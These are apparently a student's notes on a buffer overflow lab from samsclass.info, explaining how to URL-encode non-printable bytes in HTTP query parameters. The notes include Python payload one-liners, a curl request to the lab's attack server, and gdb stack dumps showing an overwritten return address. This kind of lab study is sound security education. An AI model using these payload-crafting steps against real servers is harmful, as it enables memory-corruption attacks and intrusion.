# Buffer Overflow with HTTP Query Parameters

https://samsclass.info/127/proj/ED202c.htm


When we create a buffer overflow by sending an HTTP request to a server and need to send a number to the stack, we can do so by adding `%` before the needed character/number.


## Example 1: Sending a number in payload


For example, suppose we want to get the flag if the 31st character of some key has to equal 7:


```c
    if (key[30] == 7) {
        printf("Congratulations!  The first flag is XXXXXXXXXXXXXXXXX\n");
    }
```

We can generate the key we need and append the `%07` to it:

```python
print('U'*30 + '%07')
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUU%07
```

Send the request:

```bash
curl -X GET https://attack.samsclass.info/ED202e/ED202.5b.php?string=UUUUUUUUUUUUUUUUUUUUUUUUUUUUUU%07&submit=debug
```

And we get the key:

```
Executing gdb command: continue
Enter product key: Congratulations!  The first flag is SPECIAL-CHARACTER

Program received signal SIGSEGV, Segmentation fault.
```

## Example 2: Non-Existant Hexadecimal Value

Another example would be if we know that the we want to send the EIP to the address `0x565556dc`. The problem here is that the `\xdc` hex value doesn't represent an ASCII character. So sending the little Endian address would generate a `0x00` instead in the stack:

```bash
❯ python2 -c "print 'U'*37+ '\xdc\x56\x55\x56'"
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUVUV
```

See value in bottom right corner (`0x00565556`):
```
(gdb) x/40x $esp

0xffffdc20:	0xf7fe76eb	0x55557000	0x55555555	0x55555555
0xffffdc30:	0x55555555	0x55555555	0x55555555	0x55555555
0xffffdc40:	0x55555555	0x55555555	0x55555555	0x00565556
```

To work around this, we can insert `%dc` instead:

```bash
❯ python2 -c "print 'U'*37+ '%dc\x56\x55\x56'"
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU%dcVUV
```
